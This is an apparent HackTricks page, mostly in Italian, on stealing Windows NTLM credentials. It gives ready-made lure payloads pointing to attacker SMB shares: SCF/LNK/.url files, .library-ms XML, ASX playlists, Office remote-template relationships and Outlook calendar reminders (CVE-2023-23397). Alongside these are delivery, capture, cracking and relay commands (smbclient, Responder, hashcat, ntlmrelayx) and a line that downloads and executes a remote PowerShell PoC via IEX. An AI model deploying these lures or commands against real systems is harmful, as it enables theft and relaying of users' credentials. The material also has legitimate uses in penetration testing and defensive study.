# Places to steal NTLM creds

{{#include ../../banners/hacktricks-training.md}}

**Controlla tutte le ottime idee da [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) dal download di un file Microsoft Word online alle fonti di leak NTLM: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md e [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**

### Writable SMB share + Explorer-triggered UNC lures (ntlm_theft/SCF/LNK/library-ms/desktop.ini)

Se puoi **scrivere su una share che gli utenti o i job pianificati aprono in Explorer**, deposita file i cui metadati puntano al tuo UNC (es. `\\ATTACKER\share`). La visualizzazione della cartella attiva l’**autenticazione SMB implicita** e fa trapelare un **NetNTLMv2** al tuo listener.

1. **Genera lure** (include SCF/URL/LNK/library-ms/desktop.ini/Office/RTF/etc.)
```bash
git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
uv add --script ntlm_theft.py xlsxwriter
uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
```
2. **Droppali sulla share scrivibile** (qualsiasi cartella che la vittima apre):
```bash
smbclient //victim/share -U 'guest%'
cd transfer\
prompt off
mput lure/*
```
3. **Ascolta e cracka**:
```bash
sudo responder -I <iface>          # capture NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  # autodetects mode 5600
```
Windows può colpire diversi file contemporaneamente; tutto ciò che Explorer anteprima (`BROWSE TO FOLDER`) non richiede clic.

### Playlist di Windows Media Player (.ASX/.WAX)

Se riesci a convincere un target ad aprire o anteprima una playlist di Windows Media Player che controlli, puoi leak Net‑NTLMv2 puntando la voce a un percorso UNC. WMP tenterà di recuperare il media referenziato tramite SMB e si autenticherà implicitamente.

Payload di esempio:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
Flusso di raccolta e cracking:
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### ZIP-embedded .library-ms NTLM leak (CVE-2025-24071/24055)

Windows Explorer gestisce in modo non sicuro i file .library-ms quando vengono aperti direttamente dall’interno di un archivio ZIP. Se la definizione della library punta a un percorso UNC remoto (ad es. \\attacker\share), basta navigare/avviare il file .library-ms all’interno dello ZIP perché Explorer enumeri il UNC ed emetta autenticazione NTLM verso l’attaccante. Questo produce un NetNTLMv2 che può essere craccato offline o potenzialmente relayato.

Minimal .library-ms che punta a un UNC dell’attaccante
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
Passaggi operativi
- Crea il file .library-ms con l’XML sopra (imposta il tuo IP/hostname).
- Zippalo (su Windows: Send to → Compressed (zipped) folder) e consegna lo ZIP al target.
- Avvia un listener di capture NTLM e attendi che la vittima apra il .library-ms dall’interno dello ZIP.


### Outlook calendar reminder sound path (CVE-2023-23397) – zero-click Net-NTLMv2 leak

Microsoft Outlook for Windows processava la proprietà MAPI estesa PidLidReminderFileParameter negli elementi del calendario. Se quella proprietà punta a un percorso UNC (ad es., \\attacker\share\alert.wav), Outlook contatterà la share SMB quando scatta il reminder, esponendo il Net-NTLMv2 dell’utente senza alcun click. Questa issue è stata corretta il 14 marzo 2023, ma resta molto rilevante per fleet legacy/non aggiornate e per historical incident response.

Quick exploitation con PowerShell (Outlook COM):
```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```
Lato listener:
```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```
Note
- Una vittima deve avere solo Outlook for Windows in esecuzione quando il promemoria si attiva.
- Il leak produce Net‑NTLMv2 adatto al cracking offline o al relay (non pass‑the‑hash).


### .LNK/.URL icon-based zero-click NTLM leak (CVE-2025-50154 – bypass of CVE-2025-24054)

Windows Explorer renderizza automaticamente le icone dei collegamenti. Ricerche recenti hanno mostrato che, anche dopo la patch di Microsoft di aprile 2025 per i collegamenti con icone UNC, era ancora possibile attivare l’autenticazione NTLM senza clic ospitando il target del collegamento su un percorso UNC e mantenendo l’icona locale (il bypass della patch è stato assegnato a CVE-2025-50154). Semplicemente visualizzare la cartella fa sì che Explorer recuperi i metadati dal target remoto, emettendo NTLM verso il server SMB dell’attaccante.

Minimal Internet Shortcut payload (.url):
```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```
Program Shortcut payload (.lnk) via PowerShell:
```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```
Delivery ideas
- Drop the shortcut in a ZIP and get the victim to browse it.
- Place the shortcut on a writable share the victim will open.
- Combine with other lure files in the same folder so Explorer previews the items.

### No-click .LNK NTLM leak via ExtraData icon path (CVE‑2026‑25185)

Windows loads `.lnk` metadata during **view/preview** (icon rendering), not only on execution. CVE‑2026‑25185 mostra un percorso di parsing in cui i blocchi **ExtraData** fanno sì che la shell risolva un percorso icona e tocchi il filesystem **during load**, emettendo NTLM in uscita quando il percorso è remoto.

Condizioni chiave di trigger (osservate in `CShellLink::_LoadFromStream`):
- Includere **DARWIN_PROPS** (`0xa0000006`) in ExtraData (gate to icon update routine).
- Includere **ICON_ENVIRONMENT_PROPS** (`0xa0000007`) con **TargetUnicode** popolato.
- Il loader espande le variabili d'ambiente in `TargetUnicode` e chiama `PathFileExistsW` sul percorso risultante.

Se `TargetUnicode` risolve a un percorso UNC (ad es. `\\attacker\share\icon.ico`), **semplicemente visualizzare una cartella** che contiene il collegamento causa autenticazione in uscita. Lo stesso percorso di load può essere attivato anche da **indexing** e **AV scanning**, rendendolo una superficie pratica di leak no-click.

Il tooling di ricerca (parser/generator/UI) è disponibile nel progetto **LnkMeMaybe** per costruire/ispezionare queste strutture senza usare la GUI di Windows.


### WebDAV auth coercion / credential validation via `davclnt.dll,DavSetCookie`

Il client nativo **WebDAV** può essere abusato per forzare la sessione di logon corrente ad autenticarsi verso un endpoint **HTTP/WebDAV** arbitrario:
```cmd
rundll32.exe davclnt.dll,DavSetCookie <HOST> http://<TARGET>/C$/Windows
```
Perché è utile:
- Contro un **attacker-controlled WebDAV server**, può attivare **NTLM over HTTP** senza usare un client personalizzato.
- Contro **internal hosts**, è un modo discreto per **verificare dove le credenziali rubate vengono accettate** prima di muoversi lateralmente.
- Il comando è una buona alternativa quando l'uscita **SMB egress** è filtrata ma **HTTP/WebDAV** è ancora raggiungibile.

Note operative:
- Il servizio **WebClient** deve essere in esecuzione sull'host sorgente.
- `rundll32.exe` carica `davclnt.dll` e fa gestire a Windows l'autenticazione WebDAV usando le **current user's credentials**.
- Se lo punti verso infrastruttura che controlli, usa un listener/relay HTTP NTLM-aware come:
```bash
# Capture or relay NTLM over HTTP/WebDAV
ntlmrelayx.py -t smb://<TARGET> --http-port 80
```
Dal punto di vista del rilevamento, esecuzioni ripetute di `rundll32.exe davclnt.dll,DavSetCookie` contro molti sistemi interni sono un forte segnale di **credential validation / spray-like lateral movement prep** piuttosto che di comportamento utente normale.

### Office remote template injection (.docx/.dotm) to coerce NTLM

I documenti Office possono fare riferimento a un template esterno. Se imposti il template allegato a un percorso UNC, l’apertura del documento autenticherà verso SMB.

Modifiche minime alle relazioni DOCX (dentro word/):

1) Modifica word/settings.xml e aggiungi il riferimento al template allegato:
```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```
2) Modifica word/_rels/settings.xml.rels e punta rId1337 al tuo UNC:
```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```
3) Repack in .docx e consegna. Avvia il tuo listener di cattura SMB e attendi l’apertura.

Per idee post-capture su relaying o abuse di NTLM, consulta:

{{#ref}}
README.md
{{#endref}}


## References
- [HTB: Breach – Writable share lures + Responder capture → NetNTLMv2 crack → Kerberoast svc_mssql](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [MSRC – Microsoft mitigates Outlook EoP (CVE‑2023‑23397) and explains the NTLM leak via PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [Cymulate – Zero‑click, one NTLM: Microsoft security patch bypass (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)
- [TrustedSec – LnkMeMaybe: A Review of CVE‑2026‑25185](https://trustedsec.com/blog/lnkmemaybe-a-review-of-cve-2026-25185)
- [TrustedSec LnkMeMaybe tooling](https://github.com/trustedsec/LnkMeMaybe)
- [Rapid7 – When IT Support Calls: Dissecting a ModeloRAT Campaign from Teams to Domain Compromise](https://www.rapid7.com/blog/post/tr-it-support-dissecting-modelorat-campaign-microsoft-teams-compromise)
- [Microsoft Learn – davclnt.h header](https://learn.microsoft.com/en-us/windows/win32/api/davclnt/)
- [Splunk – Windows Rundll32 WebDAV Request](https://research.splunk.com/endpoint/320099b7-7eb1-4153-a2b4-decb53267de2/)


{{#include ../../banners/hacktricks-training.md}}
